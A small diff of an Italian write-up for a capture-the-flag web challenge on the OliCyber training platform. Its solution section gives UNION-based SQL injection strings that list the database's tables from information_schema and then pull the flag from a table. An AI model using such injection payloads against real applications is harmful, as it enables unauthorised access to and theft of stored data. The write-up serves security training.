@@ -5,10 +5,9 @@ Per il secondo livello visita la seguente pagina: http://web-17.challs.olicyber.
 Per informazioni generali sull'argomento consultare l'[introduzione](http://web-17.challs.olicyber.it/)
 
 
-SOLUZIONE
+## SOLUZIONE
 
 ```
-
 -- Prima query
 -- -- Reperisci tutte le tabelle presenti nel database
 1' OR 1=1 UNION SELECT 1, table_name, 3, 'string', 'string', 6 FROM information_schema.tables WHERE table_schema = DATABASE()  --
@@ -22,5 +21,4 @@ SOLUZIONE
 -- Terza query
 -- -- Reperisci la flag
 1' OR 1=1 UNION SELECT 1, 2, 3, id, flag, 6 FROM real_data -- 
-
 ```
